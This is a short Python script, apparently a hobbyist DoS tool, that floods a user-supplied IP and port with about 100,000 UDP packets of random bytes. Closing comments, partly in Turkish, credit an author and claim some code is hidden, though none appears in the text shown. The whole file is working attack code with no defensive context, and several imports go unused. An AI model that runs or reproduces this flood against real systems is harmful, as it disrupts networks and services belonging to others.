import socket
import random
import time
import colorama
from colorama import Fore, Style
from threading import Thread
from bs4 import BeautifulSoup

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input(" > Target IP : ")
port = int(input(" > Target Port : "))
sleep = float(input(" > Sleep: "))

s.connect((ip, port))

for i in range(1, 100 * 1000):
  s.send(random._urandom(10) * 1000)
  print(f" > Send: {i}", end='\r')
  time.sleep(sleep)

#made by dede,style :D #base64 :)
#bu programda bi takım kodlar gizlenmiştir bi akıllılık yapıp çalmanızı tavsiye etmem